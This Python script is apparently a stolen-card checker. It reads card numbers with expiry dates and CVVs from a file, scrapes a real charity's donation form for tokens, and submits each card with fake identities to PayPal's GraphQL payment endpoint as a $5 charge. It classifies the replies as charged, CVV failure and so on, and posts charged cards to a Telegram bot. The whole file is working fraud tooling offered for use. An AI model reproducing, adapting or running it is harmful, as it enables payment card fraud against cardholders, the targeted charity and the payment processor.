import re
import requests
from user_agent import generate_user_agent
from faker import Faker
import json
import random
from cfonts import render
import time
import requests,re,time,random,string,pyfiglet, webbrowser
from colorama import Fore
from datetime import datetime
webbrowser.open('https://t.me/+Olq5fI5tsjw5OGE0')
Z = '\033[1;31m'
F = '\033[2;32m'
GRAY = '\033[1;30m'
ORANGE = '\033[38;5;208m'
RESET = '\033[0m'
Z =  '\033[1;31m';F = '\033[2;32m'

text = "paypal";color1 = "white";color2 = "red"
logo = render(text, colors = [color1, color2], align = "center")

print(logo)


sdr = input("Enter file name : ")
def file_card(file_name):
	card = []
	try:
		with open(file_name, "r") as file:
			for lins in file:
				cc = lins.strip().split("|")
				if len(cc) == 4:
					data_card = {
							"num": cc[0],
							"mon": cc[1],
							"yer": cc[2][-2:],
							"cvc": cc[3],
					}
					card.append(data_card)
		return card
	except:
		print(f"Not found file name {file_name} ⛔")
		exit()



def info_requests():
	us = generate_user_agent();r = requests.Session();fake = Faker()
	return us, r, fake

def var_response_msg(us, r):
	import requests
	url = "https://www.brightercommunities.org/donate-form/"
	headers = {'User-Agent': us,}
	
	response = r.get(url, headers=headers)
	hash = re.findall(r'(?<=name="give-form-hash" value=").*?(?=")', response.text)[0];form_id = re.findall(r'(?<=name="give-form-id" value=").*?(?=")', response.text)[0];prefix = re.findall(r'(?<=name="give-form-id-prefix" value=").*?(?=")', response.text)[0]
	if not hash:
		print("form hash not found ⛔")
		return None, None, None
	if not form_id:
		print("form id not found ⛔")
		return None, None, None
	if not prefix:
		print("form prefix not found ⛔")
		return None, None, None
	return hash, form_id, prefix
	
def requests_id(us, r, fake, hash, form_id, prefix):
	import requests
	url = "https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
	
	payload = {'give-form-id-prefix': prefix,'give-form-id': form_id,'give-form-minimum': '5.00','give-form-hash': hash,'give-amount': '5.00','give_first': fake.first_name(),'give_last': fake.last_name(),'give_email': fake.email()}

	headers = {'User-Agent': us,}
	response = r.post(url, data=payload, headers=headers)
	id = (response.json()["data"]["id"])
	if not id:
		print("id not found ⛔")
		return None
	return id


def info_cards(card):
	c = card["num"]
	info_card = ({'3': 'JCB','4': 'VISA','5': 'MASTER_CARD','6': 'DISCOVER'}.get(c[0], "Unknown card type"))
	if not info_card:
		print("not found card 😤")
		return None
	return info_card
	

def response_msg(card, us, r, fake, id, info_card):
	url = "https://www.paypal.com/graphql?fetch_credit_form_submit="
	
	payload = {
	  "query": "\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ",
	  "variables": {
	    "token": id,
	    "card": {
	      "cardNumber": card["num"],"type": info_card,"expirationDate": card["mon"]+'/20'+card["yer"],"postalCode": fake.zipcode(),"securityCode": card["cvc"],
	    },"phoneNumber": fake.phone_number(),"firstName": fake.first_name(),"lastName": fake.last_name(),"billingAddress": {"givenName": fake.first_name(),"familyName": fake.last_name(),"country": "US","line1": fake.street_address(),"line2": "","city": fake.city(),"state": fake.state_abbr(),"postalCode": fake.zipcode(),
	    },
	    "shippingAddress": {"givenName": fake.first_name(),"familyName": fake.last_name(),"country": "US","line1": fake.street_address(),"line2": "","city": fake.city(),"state": fake.state_abbr(),"postalCode": fake.zipcode(),
	    },"email": fake.email(),"currencyConversionType": "PAYPAL"
	  },"operationName": None
	}

	headers = {'User-Agent': us,'Content-Type': "application/json"}
	response = r.post(url, data=json.dumps(payload), headers=headers)

	text_paypal = response.text;time.sleep(random.randint(2, 5))
	return text_paypal
num_card = 0
def msg_card(card, text_paypal):
	global num_card
	num_card += 1
	card_info = f"{cards['num']}|{cards['mon']}|{cards['yer']}|{cards['cvc']}"
	if "accessToken" in text_paypal or "cartId" in text_paypal:
		msg = ("𝗖𝗵𝗮𝗿𝗴𝗲𝗱 5.00$ ❇️")
	elif "INVALID_SECURITY_CODE" in text_paypal:
		msg = ("CVV2_FAILURE! ❇️")
	elif "GRAPHQL_VALIDATION_FAILED" in text_paypal:
		msg = ("GRAPHQL_VALIDATION_FAILED")
	elif "EXISTING_ACCOUNT_RESTRICTED" in text_paypal:
		msg = ("EXISTING ACCOUNT RESTRICTED!")
	elif "RISK_DISALLOWED" in text_paypal:
		msg = ("RISK_DISALLOWED")
	elif "ISSUER_DATA_NOT_FOUND" in text_paypal:
		msg = ("ISSUER_DATA_NOT_FOUND")
	elif "INVALID_BILLING_ADDRESS" in text_paypal:
		msg = ("INSUFFICIENT_FUNDS! ❇️")
	elif "R_ERROR" in text_paypal:
		msg = ("CARD_GENERIC_ERROR")
	elif "ISSUER_DECLINE" in text_paypal:
		msg = ("ISSUER_DECLINE")
	elif "EXPIRED_CARD" in text_paypal:
		msg = ("EXPIRED_CARD")
	elif "LOGIN_ERROR" in text_paypal:
		msg = ("LOGIN_ERROR")
	elif "VALIDATION_ERROR" in text_paypal:
		msg = ("VALIDATION_ERROR")
	else:
		msg = (text_paypal)
	if msg in ["CVV2_FAILURE! ❇️", "INSUFFICIENT_FUNDS! ❇️"]:
		return (F+f'[{num_card}]',card_info,f' {Z}➜ {F}', msg)
	elif msg in ["𝗖𝗵𝗮𝗿𝗴𝗲𝗱 5.00$ ❇️"]:
		IDD = "null"
		TokenN = "null"
		card_info = f"{cards['num']}|{cards['mon']}|{cards['yer']}|{cards['cvc']}"
		mgs1=f'''◆ 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ✅
◆ Card  ➜ {card_info}
◆ First_name ➜ {fake.first_name()}
◆ Last_name ➜ {fake.last_name()}
◆ Street_address ➜ {fake.street_address()}
◆ City ➜ {fake.city()}
◆ State_abbress ➜ {fake.state_abbr()}
◆ Zipcode ➜ {fake.zipcode()}
◆ Phone_number ➜ {fake.phone_number()}
◆ Email ➜ {fake.email()}
━━━━━━━━━━━━━━━━━  
◆ 𝑩𝒀: @I_PNP '''
		tlg = f"https://api.telegram.org/bot{TokenN}/sendMessage?chat_id={IDD}&text={mgs1}"
		i = requests.post(tlg)
		return (f"{Z}[{num_card}]", card_info, f" {F}➜ {Z}", msg)
	else:
		return (f"{Z}[{num_card}]", card_info, f" {F}➜ {Z}", msg)

	


if __name__ == "__main__":
	file_name = f"{sdr}"
	card = file_card(file_name)
	for cards in card:
		time.sleep(random.randint(6, 10))
		us, r, fake = info_requests()
		hash, form_id, prefix = var_response_msg(us, r)
		id = requests_id(us, r, fake, hash, form_id, prefix)
		info_card = info_cards(cards)
		text_paypal = response_msg(cards, us, r, fake, id, info_card)
		ms = msg_card(cards, text_paypal)
		print(' '.join(str(item) for item in ms))
		ms_str = str(ms)
		if "INSUFFICIENT_FUNDS! ❇️" in ms_str or "CVV2_FAILURE! ❇️" in ms_str or "𝗖𝗵𝗮𝗿𝗴𝗲𝗱 5.00$ ❇️" in ms_str:
			print(f'{F}_' * 71)
		else:
			print(f'{Z}_' * 71)